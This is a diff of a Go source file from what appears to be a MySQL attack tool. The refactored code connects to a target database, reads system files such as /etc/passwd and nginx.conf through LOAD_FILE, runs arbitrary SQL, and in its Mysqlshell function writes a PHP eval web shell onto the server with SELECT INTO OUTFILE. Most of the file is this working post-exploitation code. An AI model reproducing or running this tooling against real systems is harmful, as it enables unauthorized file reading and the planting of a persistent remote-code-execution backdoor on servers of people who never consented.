@@ -2,94 +2,129 @@ package cmdpackage
 
 import (
 	"Rpcon/common"
+	"Rpcon/pkg"
+	"database/sql"
 	"fmt"
 	_ "github.com/go-sql-driver/mysql"
-	"github.com/jmoiron/sqlx"
-	"golang.org/x/net/context"
 	"io/ioutil"
 	"log"
-	"strconv"
 )
 
 var (
 	mysqread = []string{"SELECT LOAD_FILE('/etc/passwd')", "select user()", "show variables like '%plugins%' ;", "select @@version_compile_os", "SELECT LOAD_FILE('/etc/nginx/nginx.conf' )", "show global variables like 'secure%';", "show variables like '%general%';"}
-	result   string
-	username string
+	isdebug  = true
 	key      string
 	aaa      string
-	time1    string
-	time2    string
 )
 
-func mysqlcmd() {
-	dsn := common.User + ":" + common.Password + "@tcp(" + common.Host + ":" + strconv.Itoa(common.Port) + ")/" + common.DBname
-	//dsn := "root:root@(192.168.84.133:3306)/mysql"
-	//fmt.Println(dsn)
-	db, err := sqlx.Open("mysql", dsn)
-	//println(db.Ping())
+func mysqlcmd() (*sql.DB, error) {
+	dns := fmt.Sprintf("%v:%v@(%v:%v)/%v", common.User, common.Password, common.Host, common.Port, common.DBname)
+	if isdebug {
 
-	if err != nil {
-		fmt.Println(err)
 	}
-	defer func() { db.Close() }()
+	db, err := sql.Open("mysql", dns)
+	if err != nil {
+		log.Fatal("Open Connection failed:", err.Error())
+	}
 	db.SetMaxOpenConns(20)
 	db.SetMaxIdleConns(10)
-	ctx := context.Background()
-	for i, _ := range mysqread {
-		sqle, err := db.QueryContext(ctx, mysqread[i])
+	return db, err
+}
+
+func Query() {
+
+	db, _ := mysqlcmd()
+	if common.Code != "" {
+		stmt, err := db.Prepare(common.Code)
 		if err != nil {
-			fmt.Println("读取失败")
+			log.Fatal("Prepare failed:", err.Error())
 		}
-		for sqle.Next() {
-			err := sqle.Scan(&result)
-			if err != nil {
-				sqle.Scan(&time1, &time2)
-				log.Println(time1, time2+"\n")
-			} else {
-				log.Println(result + "\n")
-			}
+		defer stmt.Close()
+		//通过Statement执行查询
+		rows, err := stmt.Query()
+		if err != nil {
+			log.Fatal("Query failed:", err.Error())
 		}
+
+		//建立一个列数组
+		cols, err := rows.Columns()
+		var colsdata = make([]interface{}, len(cols))
+		for i := 0; i < len(cols); i++ {
+			colsdata[i] = new(interface{})
+			fmt.Print(cols[i])
+			fmt.Print("\t")
+		}
+		fmt.Println()
+
+		//遍历每一行
+		for rows.Next() {
+			rows.Scan(colsdata...) //将查到的数据写入到这行中
+			pkg.PrintRow(colsdata) //打印此行
+		}
+		defer rows.Close()
+		defer func() { db.Close() }()
 	}
-	if common.Code != "ms" && common.Code != "" {
-		rows, err := db.QueryContext(ctx, common.Code)
+}
+
+func Mysqlshell() {
+	db, err := mysqlcmd()
+	if common.File != "" {
+		key, err = Readfile(common.File)
+		if err != nil {
+			fmt.Println("打开文件失败")
+		}
+	} else {
+		key = "<?php @eval($_POST[1]);?>"
+	}
+	path := fmt.Sprintf("select '%s' into outfile '%s';", key, common.Path)
+	ss, err := db.Query(path)
+	if err != nil {
+		fmt.Println("写入shell失败，目标没有写入权限或者文件名相同 请重新确认文件名和路径")
+	} else {
+		log.Println("写入shell成功")
+	}
+	for ss.Next() {
+		err := ss.Scan(&aaa)
 		if err != nil {
 			log.Println(err)
 		}
-		for rows.Next() {
-			// Scan()遍历并赋值给变量
-			err := rows.Scan(&username)
-			if err != nil {
-				log.Fatal(err)
-			}
-			log.Println(username)
-		}
+		log.Println("写入shell成功")
 	}
-	if common.Code == "ms" {
+	defer func() { db.Close() }()
+}
 
-		if common.File != "" {
-			key, err = Readfile(common.File)
-			if err != nil {
-				fmt.Println("打开文件失败")
-			}
-		} else {
-			key = "<?php @eval($_POST[1]);?>"
-		}
-		path := fmt.Sprintf("select '%s' into outfile '%s';", key, common.Path)
-		ss, err := db.QueryContext(ctx, path)
+func Myconfig() {
+	db, _ := mysqlcmd()
+	for i, _ := range mysqread {
+		stmt, err := db.Prepare(mysqread[i])
 		if err != nil {
-			fmt.Println("写入shell失败，目标没有写入权限或者文件名相同 请重新确认文件名和路径")
-		} else {
-			log.Println("写入shell成功")
+			log.Fatal("Prepare failed:", err.Error())
 		}
-		for ss.Next() {
-			err := ss.Scan(&aaa)
-			if err != nil {
-				log.Println(err)
-			}
-			log.Println("写入shell成功")
+		defer stmt.Close()
+		//通过Statement执行查询
+		rows, err := stmt.Query()
+		if err != nil {
+			log.Fatal("Query failed:", err.Error())
 		}
-	}
 
+		//建立一个列数组
+		cols, err := rows.Columns()
+		var colsdata = make([]interface{}, len(cols))
+		for i := 0; i < len(cols); i++ {
+			colsdata[i] = new(interface{})
+			fmt.Print(cols[i])
+			fmt.Print("\t")
+		}
+		fmt.Println()
+
+		//遍历每一行
+		for rows.Next() {
+			rows.Scan(colsdata...) //将查到的数据写入到这行中
+			pkg.PrintRow(colsdata) //打印此行
+		}
+		defer rows.Close()
+	}
+	defer func() { db.Close() }()
 }
 
 func Readfile(filename string) (string, error) {
